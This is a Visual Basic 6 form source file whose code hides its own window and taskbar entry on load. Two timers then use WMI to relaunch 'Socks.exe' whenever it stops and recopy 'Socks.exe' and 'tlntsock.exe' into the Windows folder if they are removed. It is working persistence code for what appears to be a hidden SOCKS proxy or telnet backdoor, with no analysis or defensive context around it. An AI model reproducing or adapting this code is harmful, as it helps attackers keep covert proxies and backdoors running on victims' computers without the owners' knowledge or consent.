VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "Form1"
   ClientHeight    =   3015
   ClientLeft      =   120
   ClientTop       =   465
   ClientWidth     =   4560
   Icon            =   "Formn.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   3015
   ScaleWidth      =   4560
   StartUpPosition =   3  '´°¿ÚÈ±Ê¡
   Begin VB.Timer Timer2 
      Interval        =   30000
      Left            =   2760
      Top             =   2280
   End
   Begin VB.Timer Timer1 
      Interval        =   10000
      Left            =   720
      Top             =   1320
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Form_Load()
Me.Hide
App.TaskVisible = False
End Sub

Private Sub Timer1_Timer()
On Error Resume Next
If CheckExeIsRun("Socks.exe") = False Then
Set ws = CreateObject("wscript.shell")
ws.run "c:\windows\Socks.exe"
End If
DoEvents
End Sub
Private Function CheckExeIsRun(exeName As String) As Boolean
On Error GoTo err
Dim WMI
Dim Obj
Dim Objs
CheckExeIsRun = False
Set WMI = GetObject("WinMgmts:")
Set Objs = WMI.InstancesOf("Win32_Process")
For Each Obj In Objs
If (InStr(UCase(exeName), UCase(Obj.Description)) <> 0) Then
CheckExeIsRun = True
If Not Objs Is Nothing Then Set Objs = Nothing
If Not WMI Is Nothing Then Set WMI = Nothing
Exit Function
End If
Next
If Not Objs Is Nothing Then Set Objs = Nothing
If Not WMI Is Nothing Then Set WMI = Nothing
Exit Function
err:
If Not Objs Is Nothing Then Set Objs = Nothing
If Not WMI Is Nothing Then Set WMI = Nothing
End Function

Private Sub Timer2_Timer()
On Error Resume Next
Set fso = CreateObject("scripting.filesystemobject")
If fso.fileexists("c:\windows\Socks.exe") = False Then: FileCopy "c:\windows\system32\Socks.exe", "c:\windows\Socks.exe"
If fso.fileexists("c:\windows\tlntsock.exe") = False Then: FileCopy "c:\windows\system32\tlntsock.exe", "c:\windows\tlntsock.exe"
End Sub
